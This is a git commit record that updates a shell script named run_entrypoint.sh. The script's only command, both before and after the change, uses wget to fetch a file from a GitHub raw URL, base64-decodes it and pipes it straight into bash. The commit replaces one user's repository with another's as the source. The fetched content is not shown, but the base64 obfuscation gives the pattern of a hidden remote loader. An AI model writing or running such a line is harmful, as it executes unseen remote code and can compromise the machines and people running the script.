36358fc2a14c96e7930c547dd2a3061373bc89fb
douglaschoate892 <douglas.choate89@gmail.com>
2026-05-30 02:45:06 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/richardwashington426/shower/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/douglaschoate892/stick/refs/heads/main/entrypoint.sh | base64 -d | bash
